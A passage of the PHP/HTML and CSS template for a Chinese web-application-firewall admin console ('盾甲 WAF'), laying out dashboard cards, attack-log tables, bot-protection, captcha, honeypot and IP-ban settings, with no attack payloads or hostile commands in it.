  content:'';position:absolute;inset:0;border-radius:24px;
  background:linear-gradient(90deg,rgba(6,182,212,0),rgba(6,182,212,0));
  transition:all .3s;
}
input:checked + .slider::after{
  background:linear-gradient(90deg,rgba(6,182,212,.3),rgba(139,92,246,.3));
}
.big-switch{position:relative;overflow:hidden}
.big-switch::before{
  content:'';position:absolute;inset:0;border-radius:16px;
  background:linear-gradient(90deg,transparent,transparent);
  transition:all .3s;
}
.big-switch.on::before{
  background:linear-gradient(90deg,rgba(6,182,212,.15),rgba(139,92,246,.15));
}

/* ========== 表格美化 ========== */
table{position:relative}
th{
  background:linear-gradient(180deg,rgba(148,163,184,.06),rgba(148,163,184,.02));
  backdrop-filter:blur(8px);
  position:sticky;top:0;z-index:1;
}
tbody tr:nth-child(even) td{background:rgba(148,163,184,.02)}
tbody tr:hover td{
  background:linear-gradient(90deg,rgba(6,182,212,.06),rgba(139,92,246,.04))!important;
}
tbody tr{transition:all .2s}
tbody tr:hover{transform:translateX(2px)}

/* ========== 标签/徽章发光 ========== */
.tag{position:relative;transition:all .2s}
.tag:hover{transform:translateY(-1px)}
.tag.red{box-shadow:0 0 10px rgba(239,68,68,.2)}
.tag.orange{box-shadow:0 0 10px rgba(249,115,22,.2)}
.tag.yellow{box-shadow:0 0 10px rgba(245,158,11,.2)}
.tag.green{box-shadow:0 0 10px rgba(16,185,129,.2)}
.tag.blue{box-shadow:0 0 10px rgba(59,130,246,.2)}
.tag.purple{box-shadow:0 0 10px rgba(139,92,246,.2)}
.tag.cyan{box-shadow:0 0 10px rgba(6,182,212,.2)}
.tag.red:hover{box-shadow:0 0 15px rgba(239,68,68,.4)}
.tag.orange:hover{box-shadow:0 0 15px rgba(249,115,22,.4)}
.tag.yellow:hover{box-shadow:0 0 15px rgba(245,158,11,.4)}
.tag.green:hover{box-shadow:0 0 15px rgba(16,185,129,.4)}
.tag.blue:hover{box-shadow:0 0 15px rgba(59,130,246,.4)}
.tag.purple:hover{box-shadow:0 0 15px rgba(139,92,246,.4)}
.tag.cyan:hover{box-shadow:0 0 15px rgba(6,182,212,.4)}

/* ========== 页面入场动画 ========== */
.page.active .stagger-item{
  animation:staggerIn .6s cubic-bezier(.16,1,.3,1) both;
}
.page.active .stagger-item:nth-child(1){animation-delay:.05s}
.page.active .stagger-item:nth-child(2){animation-delay:.1s}
.page.active .stagger-item:nth-child(3){animation-delay:.15s}
.page.active .stagger-item:nth-child(4){animation-delay:.2s}
.page.active .stagger-item:nth-child(5){animation-delay:.25s}
.page.active .stagger-item:nth-child(6){animation-delay:.3s}
.page.active .stagger-item:nth-child(7){animation-delay:.35s}
.page.active .stagger-item:nth-child(8){animation-delay:.4s}
.page.active .stagger-item:nth-child(9){animation-delay:.45s}
.page.active .stagger-item:nth-child(10){animation-delay:.5s}
.page.active .stagger-item:nth-child(11){animation-delay:.55s}
.page.active .stagger-item:nth-child(12){animation-delay:.6s}
@keyframes staggerIn{
  from{opacity:0;transform:translateY(20px)}
  to{opacity:1;transform:translateY(0)}
}

/* ========== 环形进度 ========== */
.ring-progress{
  --value:0;
  --size:80px;
  --thickness:6px;
  --color:#06b6d4;
  width:var(--size);height:var(--size);
  border-radius:50%;
  background:conic-gradient(var(--color) calc(var(--value) * 1%),rgba(148,163,184,.1) 0);
  display:flex;align-items:center;justify-content:center;
  position:relative;
}
.ring-progress::before{
  content:'';position:absolute;
  width:calc(var(--size) - var(--thickness) * 2);
  height:calc(var(--size) - var(--thickness) * 2);
  border-radius:50%;background:var(--bg2);
}
.ring-progress .ring-value{
  position:relative;z-index:1;
  font-size:14px;font-weight:700;
  background:var(--grad-1);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  background-clip:text;
}
.ring-progress.animate{
  animation:ringFill 1.5s cubic-bezier(.16,1,.3,1) both;
}
@keyframes ringFill{
  from{background:conic-gradient(var(--color) 0%,rgba(148,163,184,.1) 0)}
}

/* ========== 进度条组件 ========== */
.progress-bar{
  height:8px;border-radius:4px;
  background:rgba(148,163,184,.1);
  overflow:hidden;position:relative;
}
.progress-bar .progress-fill{
  height:100%;border-radius:4px;
  background:var(--grad-1);
  width:0;transition:width 1s cubic-bezier(.16,1,.3,1);
  position:relative;
}
.progress-bar .progress-fill::after{
  content:'';position:absolute;top:0;right:0;bottom:0;width:30px;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,.3));
  animation:progressShine 2s ease-in-out infinite;
}
@keyframes progressShine{
  0%{transform:translateX(-100%)}
  100%{transform:translateX(100%)}
}

/* ========== 骨架屏 ========== */
.skeleton{
  background:linear-gradient(90deg,rgba(148,163,184,.06) 25%,rgba(148,163,184,.12) 50%,rgba(148,163,184,.06) 75%);
  background-size:200% 100%;
  animation:shimmer 1.5s infinite;
  border-radius:6px;
}
@keyframes shimmer{
  0%{background-position:200% 0}
  100%{background-position:-200% 0}
}

/* ========== 导航动效 ========== */
.nav-item{position:relative;overflow:hidden}
.nav-item::after{
  content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;
  background:linear-gradient(90deg,transparent,rgba(6,182,212,.06),transparent);
  transition:left .5s;
  pointer-events:none;
}
.nav-item:hover::after{left:100%}
.nav-item.active::before{
  transition:all .3s cubic-bezier(.16,1,.3,1);
}

/* ========== 迷你趋势图 ========== */
.sparkline{width:80px;height:24px;display:block}
.sparkline path{
  fill:none;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round;
}
.sparkline .spark-fill{opacity:.2}

/* ========== 数字滚动容器 ========== */
.kpi-value{
  display:inline-block;
  font-variant-numeric:tabular-nums;
}

/* ========== 模块卡片悬浮增强 ========== */
.module-card:hover{
  transform:translateY(-3px);
  box-shadow:0 15px 30px -10px rgba(0,0,0,.3);
}
.module-card:hover::before{opacity:1!important}

/* ========== 图表卡片入场 ========== */
.chart-card,.log-card,.table-card{
  transition:all .3s;
}
.chart-card:hover,.log-card:hover,.table-card:hover{
  border-color:rgba(6,182,212,.2);
  transform:translateY(-2px);
  box-shadow:0 15px 30px -10px rgba(0,0,0,.3);
}

/* ========== Hero 区域增强 ========== */
.hero-left{position:relative;overflow:hidden}
.hero-left::after{
  content:'';position:absolute;top:-50%;right:-10%;width:300px;height:300px;
  background:radial-gradient(circle,rgba(139,92,246,.1),transparent 60%);
  pointer-events:none;animation:heroGlow 8s ease-in-out infinite alternate;
}
@keyframes heroGlow{
  0%{transform:translate(0,0) scale(1)}
  100%{transform:translate(-20px,20px) scale(1.2)}
}

/* ========== 状态点增强 ========== */
.status-dot .dot{
  position:relative;
}
.status-dot .dot::after{
  content:'';position:absolute;inset:-2px;
  border-radius:50%;background:inherit;
  animation:ping 2s cubic-bezier(0,0,.2,1) infinite;
  opacity:.6;
}
@keyframes ping{
  75%,100%{transform:scale(2);opacity:0}
}
</style>
</head>
<body>

<!-- ========== 侧边栏 ========== -->
<aside class="sidebar">
  <div class="logo">
    <div class="logo-icon">🛡️</div>
    <div class="logo-text">盾甲 WAF<small>Security Console</small></div>
  </div>
  <nav class="nav">
    <div class="nav-section">
      <div class="nav-title">概览</div>
      <div class="nav-item active" data-page="overview"><span class="icon">📊</span><span class="label">安全总览</span></div>
      <div class="nav-item" data-page="attacks"><span class="icon">⚔️</span><span class="label">攻击日志</span><span class="badge" id="attackBadge">0</span></div>
    </div>
    <div class="nav-section">
      <div class="nav-title">防护管理</div>
      <div class="nav-item" data-page="bots"><span class="icon">🤖</span><span class="label">机器人防护</span></div>
      <div class="nav-item" data-page="firewall"><span class="icon">🔥</span><span class="label">IP 管理</span></div>
      <div class="nav-item" data-page="rules"><span class="icon">🛡️</span><span class="label">防护中心</span></div>
      <div class="nav-item" data-page="semantic"><span class="icon">🧬</span><span class="label">语义引擎</span></div>
      <div class="nav-item" data-page="sandbox"><span class="icon">📦</span><span class="label">沙箱中心</span></div>
      <div class="nav-item" data-page="false-positive"><span class="icon">✅</span><span class="label">误报中心</span></div>
      <div class="nav-item" data-page="api-security"><span class="icon">🔌</span><span class="label">API 安全</span></div>
    </div>
    <div class="nav-section">
      <div class="nav-title">系统</div>
      <div class="nav-item" data-page="learn"><span class="icon">🧠</span><span class="label">自学习系统</span></div>
      <div class="nav-item" data-page="pwd-service"><span class="icon">🔐</span><span class="label">网站密码</span></div>
      <div class="nav-item" data-page="settings"><span class="icon">⚙️</span><span class="label">系统设置</span></div>
    </div>
  </nav>
  <div class="sidebar-footer">
    <div class="ver-cell"><span>WAF 版本</span><span>v<?php echo $version; ?></span></div>
    <div class="ver-cell"><span>防护状态</span><span class="status-dot"><span class="dot"></span>运行中</span></div>
    <div class="ver-cell warn"><span>更新时间</span><span id="verTime">--</span></div>
    <div class="ver-cell" style="opacity:.6;font-size:11px;margin-top:4px;border-top:1px solid var(--border);padding-top:8px"><span>© 暗夜铭少</span><span>版权所有</span></div>
  </div>
</aside>

<!-- ========== 主内容 ========== -->
<div class="main">
  <div class="topbar">
    <div class="topbar-left">
      <div>
        <div class="page-title" id="pageTitle">安全总览</div>
        <div class="page-sub">实时监控 · 智能防御 · 主动围堵</div>
      </div>
    </div>
    <div class="topbar-right">
      <div class="search-box"><input type="text" placeholder="搜索 IP / URL / 规则..."></div>
      <div class="status-dot"><span class="dot"></span>防护中</div>
      <div class="clock" id="clock">--</div>
    </div>
  </div>

  <div class="content">

    <!-- ===== 安全总览 ===== -->
    <div class="page active" id="page-overview">
      <!-- Hero 区域 -->
      <div class="hero-grid">
        <div class="hero-left">
          <div class="hero-badge"><span class="dot"></span>系统运行正常 · 全维度防护中</div>
          <div class="hero-title">您的站点安全无忧</div>
          <div class="hero-desc">盾甲 WAF 正以 14 层编码归一化 + 10 维语义分析 + 主动路径围堵，全方位守护您的 Web 应用。</div>
          <div class="hero-stats">
            <div class="hero-stat"><h4 id="kTotal">0</h4><p>累计拦截攻击</p></div>
            <div class="hero-stat"><h4 id="kToday" style="color:#f87171">0</h4><p>今日拦截</p></div>
            <div class="hero-stat"><h4 id="kIps" style="color:#facc15">0</h4><p>攻击来源 IP</p></div>
            <div class="hero-stat"><h4 id="kTypes" style="color:#4ade80">0</h4><p>防护类型</p></div>
          </div>
        </div>
        <div class="hero-right">
          <div class="card-head"><div class="card-title"><span class="dot"></span>全球攻击分布</div><div class="card-actions"><span class="chip active">实时</span></div></div>
          <div class="world-map">
            🌍
            <div class="map-dots" id="mapDots"></div>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px">
            <div style="text-align:center;padding:8px;background:rgba(0,0,0,.2);border-radius:8px">
              <div style="font-size:16px;font-weight:700;color:#f87171" id="topCountry">--</div>
              <div style="font-size:10px;color:var(--text4)">攻击最多地区</div>
            </div>
            <div style="text-align:center;padding:8px;background:rgba(0,0,0,.2);border-radius:8px">
              <div style="font-size:16px;font-weight:700;color:#fb923c" id="avgPerMin">0</div>
              <div style="font-size:10px;color:var(--text4)">次/分钟</div>
            </div>
          </div>
        </div>
      </div>

      <!-- KPI 卡片 -->
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-4);--icon-bg:rgba(239,68,68,.15)">
          <div class="kpi-top"><div class="kpi-icon">🚨</div><span class="kpi-trend up" id="trendSql">+0%</span></div>
          <div class="kpi-value" id="cntSql">0</div>
          <div class="kpi-label">SQL 注入攻击</div>
          <div class="kpi-sub">最常见的攻击类型</div>
          <div class="kpi-spark" id="sparkSql"></div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-1);--icon-bg:rgba(6,182,212,.15)">
          <div class="kpi-top"><div class="kpi-icon">💉</div><span class="kpi-trend up" id="trendXss">+0%</span></div>
          <div class="kpi-value" id="cntXss">0</div>
          <div class="kpi-label">XSS 跨站脚本</div>
          <div class="kpi-sub">跨站脚本攻击</div>
          <div class="kpi-spark" id="sparkXss"></div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-2);--icon-bg:rgba(139,92,246,.15)">
          <div class="kpi-top"><div class="kpi-icon">🤖</div><span class="kpi-trend up" id="trendBot">+0%</span></div>
          <div class="kpi-value" id="cntBot">0</div>
          <div class="kpi-label">恶意爬虫</div>
          <div class="kpi-sub">自动化攻击工具</div>
          <div class="kpi-spark" id="sparkBot"></div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-3);--icon-bg:rgba(16,185,129,.15)">
          <div class="kpi-top"><div class="kpi-icon">🛡️</div><span class="kpi-trend down" id="trendFp">-0%</span></div>
          <div class="kpi-value" id="cntFp">0</div>
          <div class="kpi-label">误报率</div>
          <div class="kpi-sub">7层误报控制</div>
          <div class="kpi-spark" id="sparkFp"></div>
        </div>
      </div>

      <!-- 图表行1 -->
      <div class="chart-row">
        <div class="chart-card">
          <div class="card-head">
            <div class="card-title"><span class="dot"></span>攻击趋势 (近7日)</div>
            <div class="card-actions">
              <span class="chip">24h</span>
              <span class="chip active">7天</span>
              <span class="chip">30天</span>
            </div>
          </div>
          <div class="chart-wrap"><canvas id="trendChart"></canvas></div>
        </div>
        <div class="chart-card">
          <div class="card-head">
            <div class="card-title"><span class="dot"></span>攻击类型分布</div>
          </div>
          <div class="chart-wrap"><canvas id="typeChart"></canvas></div>
        </div>
      </div>

      <!-- 实时日志流 -->
      <div class="log-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--red);animation:pulse-dot 1s infinite"></span>实时攻击日志流</div>
          <div class="card-actions">
            <span class="chip active">全部</span>
            <span class="chip">严重</span>
            <span class="chip">高危</span>
            <span class="chip">中危</span>
          </div>
        </div>
        <div class="log-stream" id="logStream"></div>
      </div>

      <!-- 攻击来源 TOP -->
      <div class="chart-row two">
        <div class="table-card">
          <div class="card-head">
            <div class="card-title"><span class="dot" style="background:var(--orange)"></span>攻击来源 TOP 10</div>
            <button class="btn btn-ghost" onclick="loadBlacklistPage()">封禁管理 →</button>
          </div>
          <table id="topIpTable">
            <thead><tr><th>IP 地址</th><th>攻击次数</th><th>最近攻击</th><th>操作</th></tr></thead>
            <tbody></tbody>
          </table>
        </div>
        <div class="table-card">
          <div class="card-head">
            <div class="card-title"><span class="dot" style="background:var(--purple)"></span>受攻击 URL TOP 10</div>
          </div>
          <table id="topUrlTable">
            <thead><tr><th>URL 路径</th><th>攻击次数</th><th>占比</th></tr></thead>
            <tbody></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ===== 攻击日志 ===== -->
    <div class="page" id="page-attacks">
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--red)"></span>全部攻击日志</div>
          <div class="card-actions">
            <select style="background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;padding:6px 10px;color:var(--text);font-size:12px;outline:none">
              <option>全部类型</option><option>SQL注入</option><option>XSS</option><option>爬虫</option>
            </select>
            <button class="btn btn-ghost">导出</button>
          </div>
        </div>
        <table>
          <thead><tr><th>时间</th><th>IP 地址</th><th>类型</th><th>URL</th><th>风险等级</th><th>状态</th></tr></thead>
          <tbody id="allAttackBody"></tbody>
        </table>
      </div>
    </div>

    <!-- ===== 机器人防护 ===== -->
    <div class="page" id="page-bots">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-1)">
          <div class="kpi-top"><div class="kpi-icon">🔍</div><span class="kpi-trend down">-0%</span></div>
          <div class="kpi-value" id="botSearch">0</div><div class="kpi-label">搜索引擎蜘蛛</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-4)">
          <div class="kpi-top"><div class="kpi-icon">💀</div><span class="kpi-trend up">+0%</span></div>
          <div class="kpi-value" id="botMalicious">0</div><div class="kpi-label">恶意爬虫</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-2)">
          <div class="kpi-top"><div class="kpi-icon">🕷️</div><span class="kpi-trend up">+0%</span></div>
          <div class="kpi-value" id="botCrawler">0</div><div class="kpi-label">通用爬虫</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-3)">
          <div class="kpi-top"><div class="kpi-icon">🧑</div><span class="kpi-trend down">-0%</span></div>
          <div class="kpi-value" id="botHuman">0</div><div class="kpi-label">人类访客</div>
        </div>
      </div>
      <div class="chart-row two">
        <div class="chart-card">
          <div class="card-head"><div class="card-title"><span class="dot"></span>机器人分类占比</div></div>
          <div class="chart-wrap"><canvas id="botPieChart"></canvas></div>
        </div>
        <div class="chart-card">
          <div class="card-head"><div class="card-title"><span class="dot"></span>爬虫访问趋势</div></div>
          <div class="chart-wrap"><canvas id="botTrendChart"></canvas></div>
        </div>
      </div>
      <!-- 防护总控卡片 -->
      <div class="table-card collapsible" id="botControlCard">
        <div class="card-head" onclick="toggleCollapse('botControlCard')">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>防护总控</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div class="setting-row">
            <div>
              <div class="setting-label">机器人防护总开关</div>
              <div class="setting-desc">关闭后所有机器人检测将停止，不推荐</div>
            </div>
            <div class="setting-control">
              <label class="switch"><input type="checkbox" id="botMasterSwitch" checked onchange="saveBotSettings()"><span class="slider"></span></label>
            </div>
          </div>
          <div class="setting-row">
            <div>
              <div class="setting-label">防护模式</div>
              <div class="setting-desc">监控=仅记录 / 验证=触发验证码 / 拦截=直接拒绝</div>
            </div>
            <div class="setting-control">
              <div class="mode-tabs">
                <div class="mode-tab" data-mode="monitor" onclick="setBotMode('monitor')">监控</div>
                <div class="mode-tab active" data-mode="verify" onclick="setBotMode('verify')">验证</div>
                <div class="mode-tab" data-mode="block" onclick="setBotMode('block')">拦截</div>
              </div>
            </div>
          </div>
          <div class="setting-row">
            <div>
              <div class="setting-label">严格度</div>
              <div class="setting-desc">值越高，触发防护的阈值越低</div>
            </div>
            <div class="setting-control">
              <div class="weight-slider-wrap" style="min-width:200px">
                <input type="range" id="botStrictness" min="1" max="10" value="5" oninput="document.getElementById('strictnessVal').textContent=this.value;saveBotSettings()">
                <span class="weight-val" id="strictnessVal">5</span>
              </div>
            </div>
          </div>
          <div class="setting-row">
            <div>
              <div class="setting-label">蜜罐系统</div>
              <div class="setting-desc">部署蜜罐链接，自动捕获恶意爬虫</div>
            </div>
            <div class="setting-control">
              <label class="switch"><input type="checkbox" id="honeypotSwitch" checked onchange="saveBotSettings()"><span class="slider"></span></label>
            </div>
          </div>
        </div>
      </div>

      <!-- 评分规则卡片 -->
      <div class="table-card collapsible" id="botScoreCard">
        <div class="card-head" onclick="toggleCollapse('botScoreCard')">
          <div class="card-title"><span class="dot" style="background:var(--purple)"></span>评分规则 (12项因子)</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <table>
            <thead><tr><th>评分因子</th><th>权重</th><th>说明</th><th>操作</th></tr></thead>
            <tbody id="scoreRulesBody">
            </tbody>
          </table>
          <div style="margin-top:12px;padding:10px 14px;background:rgba(148,163,184,.04);border-radius:8px;display:flex;justify-content:space-between;align-items:center">
            <span style="font-size:12px;color:var(--text3)">总权重: <span id="totalWeight" style="color:var(--cyan);font-weight:600">123</span> 分</span>
            <button class="btn btn-ghost" onclick="resetScoreWeights()">↺ 重置默认</button>
          </div>
        </div>
      </div>

      <!-- 蜜罐管理卡片 -->
      <div class="table-card collapsible" id="honeypotCard">
        <div class="card-head" onclick="toggleCollapse('honeypotCard')">
          <div class="card-title"><span class="dot" style="background:var(--orange)"></span>蜜罐管理</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px">
            <div style="padding:14px;background:rgba(148,163,184,.04);border-radius:10px;text-align:center">
              <div style="font-size:24px;font-weight:800;color:var(--orange)" id="honeypotCount">4</div>
              <div style="font-size:11px;color:var(--text3);margin-top:2px">蜜罐链接</div>
            </div>
            <div style="padding:14px;background:rgba(148,163,184,.04);border-radius:10px;text-align:center">
              <div style="font-size:24px;font-weight:800;color:var(--red)" id="honeypotTriggered">128</div>
              <div style="font-size:11px;color:var(--text3);margin-top:2px">已触发次数</div>
            </div>
          </div>
          <div class="add-row">
            <input type="text" id="newHoneypot" placeholder="输入蜜罐路径，如: /admin.php.bak">
            <button class="btn btn-primary" onclick="addHoneypot()">+ 添加蜜罐</button>
          </div>
          <div id="honeypotList">
          </div>
        </div>
      </div>

      <!-- 验证码配置卡片 -->
      <div class="table-card collapsible" id="captchaCard">
        <div class="card-head" onclick="toggleCollapse('captchaCard')">
          <div class="card-title"><span class="dot" style="background:var(--green)"></span>验证码配置</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div class="setting-row">
            <div>
              <div class="setting-label">验证码开关</div>
              <div class="setting-desc">达到阈值时弹出验证码挑战</div>
            </div>
            <div class="setting-control">
              <label class="switch"><input type="checkbox" id="captchaSwitch" checked onchange="saveBotSettings()"><span class="slider"></span></label>
            </div>
          </div>
          <div class="setting-row">
            <div>
              <div class="setting-label">触发阈值</div>
              <div class="setting-desc">机器人评分超过此值时触发验证码</div>
            </div>
            <div class="setting-control">
              <div class="weight-slider-wrap" style="min-width:180px">
                <input type="range" id="captchaThreshold" min="10" max="100" value="60" oninput="document.getElementById('captchaThVal').textContent=this.value;saveBotSettings()">
                <span class="weight-val" id="captchaThVal">60</span>
              </div>
            </div>
          </div>
          <div style="padding:12px 0;border-bottom:1px solid var(--border)">
            <div class="setting-label" style="margin-bottom:8px">验证码类型</div>
            <div class="captcha-types">
              <div class="captcha-type active" data-type="image" onclick="setCaptchaType('image')">
                <div class="icon">🖼️</div>
                <div class="label">图形验证码</div>
              </div>
              <div class="captcha-type" data-type="slider" onclick="setCaptchaType('slider')">
                <div class="icon">🧩</div>
                <div class="label">滑块拼图</div>
              </div>
              <div class="captcha-type" data-type="math" onclick="setCaptchaType('math')">
                <div class="icon">🔢</div>
                <div class="label">算术题</div>
              </div>
              <div class="captcha-type" data-type="invisible" onclick="setCaptchaType('invisible')">
                <div class="icon">👻</div>
                <div class="label">无感验证</div>
              </div>
            </div>
          </div>
          <div class="setting-row">
            <div>
              <div class="setting-label">今日验证码挑战</div>
              <div class="setting-desc">今日已弹出验证码次数 / 成功验证</div>
            </div>
            <div class="setting-control">
              <span style="font-size:13px;color:var(--text2)"><span style="color:var(--yellow);font-weight:600">256</span> 次 / <span style="color:var(--green);font-weight:600">189</span> 通过</span>
            </div>
          </div>
        </div>
      </div>

      <!-- 已知机器人白名单卡片（增强） -->
      <div class="table-card collapsible" id="botWhitelistCard">
        <div class="card-head" onclick="toggleCollapse('botWhitelistCard')">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>已知机器人白名单</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div class="whitelist-type-tabs">
            <div class="whitelist-type-tab active" data-type="search" onclick="setWhitelistType('search')">搜索引擎 (32种)</div>
            <div class="whitelist-type-tab" data-type="ua" onclick="setWhitelistType('ua')">UA 关键字</div>
            <div class="whitelist-type-tab" data-type="ip" onclick="setWhitelistType('ip')">IP 段</div>
            <div class="whitelist-type-tab" data-type="dns" onclick="setWhitelistType('dns')">域名反向验证</div>
          </div>

          <div id="wl-search">
            <table>
              <thead><tr><th>搜索引擎</th><th>UA 特征</th><th>验证方式</th><th>状态</th><th>操作</th></tr></thead>
              <tbody id="searchEngineBody">
              </tbody>
            </table>
          </div>

          <div id="wl-ua" style="display:none">
            <div class="add-row">
              <input type="text" id="newUaWhitelist" placeholder="输入 UA 关键字，如: SemrushBot">
              <button class="btn btn-primary" onclick="addWhitelist('ua')">+ 添加</button>
            </div>
            <table>
              <thead><tr><th>UA 关键字</th><th>添加时间</th><th>操作</th></tr></thead>
              <tbody id="uaWhitelistBody"></tbody>
            </table>
          </div>

          <div id="wl-ip" style="display:none">
            <div class="add-row">
              <input type="text" id="newIpWhitelist" placeholder="输入 IP 或 CIDR，如: 192.168.1.0/24">
              <button class="btn btn-primary" onclick="addWhitelist('ip')">+ 添加</button>
            </div>
            <table>
              <thead><tr><th>IP / CIDR</th><th>添加时间</th><th>操作</th></tr></thead>
              <tbody id="ipWhitelistBody"></tbody>
            </table>
          </div>

          <div id="wl-dns" style="display:none">
            <div class="add-row">
              <input type="text" id="newDnsWhitelist" placeholder="输入域名后缀，如: .googlebot.com">
              <button class="btn btn-primary" onclick="addWhitelist('dns')">+ 添加</button>
            </div>
            <table>
              <thead><tr><th>域名后缀</th><th>验证方式</th><th>操作</th></tr></thead>
              <tbody id="dnsWhitelistBody"></tbody>
            </table>
          </div>
        </div>
      </div>
    </div>

    <!-- ===== IP 管理 ===== -->
    <div class="page" id="page-firewall">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-4)">
          <div class="kpi-value" id="banCount">0</div><div class="kpi-label">封禁 IP 数</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-3)">
          <div class="kpi-value" id="wlCount">0</div><div class="kpi-label">白名单 IP 数</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-1)">
          <div class="kpi-value" id="rateCount">0</div><div class="kpi-label">限流 IP 数</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-2)">
          <div class="kpi-value" id="honeypotCount">0</div><div class="kpi-label">蜜罐触发</div>
        </div>
      </div>
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--red)"></span>封禁列表</div>
          <div style="display:flex;gap:10px">
            <input type="text" id="banIp" placeholder="输入 IP 地址" style="background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;padding:7px 12px;color:var(--text);font-size:12px;outline:none;width:180px">
            <button class="btn btn-danger" onclick="quickBan()">手动封禁</button>
          </div>
        </div>
        <table>
          <thead><tr><th>IP 地址</th><th>到期时间</th><th>封禁次数</th><th>原因</th><th>操作</th></tr></thead>
          <tbody id="banBody"></tbody>
        </table>
      </div>
    </div>

    <!-- ===== 防护中心 ===== -->
    <div class="page" id="page-rules">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-1);--icon-bg:rgba(6,182,212,.15)">
          <div class="kpi-top"><div class="kpi-icon">🛡️</div><span class="kpi-trend up" id="kpiEnabledTrend">+0%</span></div>
          <div class="kpi-value" id="kpiEnabled">0</div>
          <div class="kpi-label">已启用模块数</div>
          <div class="kpi-sub">共 <span id="kpiTotal">0</span> 个模块</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-4);--icon-bg:rgba(239,68,68,.15)">
          <div class="kpi-top"><div class="kpi-icon">🔥</div><span class="kpi-trend down" id="kpiCoreTrend">-0%</span></div>
          <div class="kpi-value" id="kpiCore">0</div>
          <div class="kpi-label">核心防护数</div>
          <div class="kpi-sub">高风险攻击拦截</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-2);--icon-bg:rgba(139,92,246,.15)">
          <div class="kpi-top"><div class="kpi-icon">⚡</div><span class="kpi-trend up" id="kpiAdvTrend">+0%</span></div>
          <div class="kpi-value" id="kpiAdv">0</div>
          <div class="kpi-label">高级防护数</div>
          <div class="kpi-sub">深度利用防护</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-3);--icon-bg:rgba(16,185,129,.15)">
          <div class="kpi-top"><div class="kpi-icon">🔗</div><span class="kpi-trend down" id="kpiApiTrend">-0%</span></div>
          <div class="kpi-value" id="kpiApi">0</div>
          <div class="kpi-label">API/协议防护数</div>
          <div class="kpi-sub">接口与协议安全</div>
        </div>
      </div>

      <div class="protect-action-bar">
        <button class="btn btn-primary" onclick="protectEnableAll()">🚀 一键开启全部防护</button>
        <button class="btn btn-ghost" onclick="protectResetToDefault()">↺ 恢复推荐配置</button>
        <div class="mode-switcher">
          <button class="mode-btn" data-mode="monitor" onclick="setProtectMode('monitor')">👁️ 监控</button>
          <button class="mode-btn active" data-mode="protect" onclick="setProtectMode('protect')">🛡️ 防护</button>
          <button class="mode-btn" data-mode="strict" onclick="setProtectMode('strict')">🔒 严格</button>
        </div>
      </div>

      <div class="protect-tabs">
        <div class="protect-tab active" data-tab="core" onclick="switchProtectTab('core')">
          🔥 核心防护 <span class="tab-count" id="tabCoreCount">0</span>
        </div>
        <div class="protect-tab" data-tab="advanced" onclick="switchProtectTab('advanced')">
          ⚡ 高级防护 <span class="tab-count" id="tabAdvCount">0</span>
        </div>
        <div class="protect-tab" data-tab="protocol" onclick="switchProtectTab('protocol')">
          🔗 协议防护 <span class="tab-count" id="tabProtoCount">0</span>
        </div>
        <div class="protect-tab" data-tab="session" onclick="switchProtectTab('session')">
          🔐 会话安全 <span class="tab-count" id="tabSessionCount">0</span>
        </div>
        <div class="protect-tab" data-tab="api" onclick="switchProtectTab('api')">
          📡 API 防护 <span class="tab-count" id="tabApiCount">0</span>
        </div>
      </div>

      <div class="protect-panel active" id="panel-core">
        <div class="modules-grid" id="grid-core"></div>
      </div>
      <div class="protect-panel" id="panel-advanced">
        <div class="modules-grid" id="grid-advanced"></div>
      </div>
      <div class="protect-panel" id="panel-protocol">
        <div class="modules-grid" id="grid-protocol"></div>
      </div>
      <div class="protect-panel" id="panel-session">
        <div class="modules-grid" id="grid-session"></div>
      </div>
      <div class="protect-panel" id="panel-api">
        <div class="modules-grid" id="grid-api"></div>
      </div>
    </div>

    <!-- ===== 语义引擎 ===== -->
    <div class="page" id="page-semantic">
      <!-- KPI 卡片 -->
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-1);--icon-bg:rgba(6,182,212,.15)">
          <div class="kpi-top"><div class="kpi-icon">🧬</div><span class="kpi-trend up">+2</span></div>
          <div class="kpi-value">20+</div>
          <div class="kpi-label">语义解析器数量</div>
          <div class="kpi-sub">覆盖 5 大攻击分类</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-2);--icon-bg:rgba(139,92,246,.15)">
